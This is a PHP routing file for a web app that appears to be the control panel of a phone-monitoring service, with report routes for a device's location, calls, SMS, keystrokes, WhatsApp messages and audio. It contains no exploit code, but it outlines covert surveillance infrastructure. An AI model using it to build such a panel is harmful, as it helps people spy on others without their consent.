<?php

ob_start();
ini_set("display_errors", 1);
ini_set("error_reporting", E_ALL);
error_reporting(E_ALL);

require __DIR__ . '/vendor/autoload.php';

use Source\Core\Router\Router;

$route = new Router(url(), ":");

/** Authentication Routes */
$route->setNamespace("Source\Controllers");
$route->group("/");
$route->get("/login/", "Login:login");
$route->post("/login/", "Login:login");
$route->get("/login/{redir}/", "Login:login");
$route->get("/login/{redir}/{p1}/", "Login:login");
$route->get("/login/{redir}/{p1}/{p2}/", "Login:login");
$route->get("/login/{redir}/{p1}/{p2}/{p3}/", "Login:login");
$route->get("/logout/", "Login:logout");
$route->post("/forget/", "Login:forget");
$route->get("/forget/", "Login:forget");


$route->get("/recuperar/", "Login:reset");
$route->get("/recuperar/{code}/", "Login:reset");
$route->post("/recuperar/", "Login:reset");
// $route->post("/recuperar/{code}/", "Login:forget");


/** App Routes */
$route->setNamespace("Source\Controllers");
$route->group("/");
$route->get("/", "App:home");
$route->get("/mobile/", "App:home");
$route->get("/home/", "App:home");
$route->get("/audio/", "App:audio");
$route->post("/audio/{tipo}/", "App:audio");
$route->get("/audio/{tipo}/", "App:audio");
$route->get("/faq/", "App:faq");


/** relatorio App Routes */
$route->setNamespace("Source\Controllers");
$route->group("/relatorio/");
$route->get("/localizacao/", "App:localizacao");
$route->get("/localizacao/{export}/", "App:localizacao");
$route->post("/localizacao/{id}/", "App:localizacao");
$route->get("/agenda/", "App:agenda");
$route->get("/agenda/{export}/", "App:agenda");
$route->post("/agenda/{id}/", "App:agenda");
$route->get("/ligacao/", "App:ligacao");
$route->get("/ligacao/{export}/", "App:ligacao");
// $route->get("/ligacao/{data1}/{data2}/", "App:ligacao");
// $route->get("/ligacao/{data1}/{data2}/{export}/", "App:ligacao");
$route->post("/ligacao/{id}/", "App:ligacao");
$route->get("/sms/", "App:sms");
$route->get("/sms/{export}/", "App:sms");
$route->post("/sms/{id}/", "App:sms");
$route->get("/evento/", "App:evento");
$route->get("/evento/{export}/", "App:evento");
$route->post("/evento/{id}/", "App:evento");
$route->get("/teclas-digitadas/", "App:teclasDigitadas");
$route->get("/teclas-digitadas/{export}/", "App:teclasDigitadas");
$route->post("/teclas-digitadas/{id}/", "App:teclasDigitadas");
$route->get("/whatsapp/", "App:whatsapp");
$route->get("/whatsapp/{export}/", "App:whatsapp");
$route->post("/whatsapp/{id}/", "App:whatsapp");

/** Configuração App Routes */
$route->setNamespace("Source\Controllers");
$route->group("/configuracao/");
$route->post("/tarefa/", "App:tarefa");
$route->get("/tarefa/", "App:tarefa");
$route->post("/registro/", "App:registro");
$route->get("/registro/", "App:registro");
$route->get("/registro/{vencido}/", "App:registro");
$route->get("/registro/{vencido}/{uso}/", "App:registro");
$route->post("/alterar-senha/", "App:alterarSenha");
$route->get("/alterar-senha/", "App:alterarSenha");
$route->post("/trocar-aparelho/", "App:trocarAparelho");
$route->get("/trocar-aparelho/", "App:trocarAparelho");

$route->get("/excluir-relatorio/", "App:excluirRelatorio");
$route->post("/excluir-relatorio/{column}/", "App:excluirRelatorio");
$route->post("/excluir-relatorio/{column}/{data1}/{data2}/", "App:excluirRelatorio");


/**
 * Account Routes
 */
$route->setNamespace("Source\Controllers");
$route->group("/account");
$route->post("/profile/", "Account:profile");


/** PDF Routes */
$route->setNamespace("Source\Controllers");
$route->group("/");
$route->get("/gerar-pdf/", "Pdf:gerar");


/** Error Routes */
$route->setNamespace("Source\Controllers");
$route->group("/ops");
$route->get("/{errorcode}/", "Error:error");
$route->dispatch();

/** Error Redirect */
if ($route->error()) {
    $route->redirect("/ops/{$route->error()}");
}

ob_end_flush();
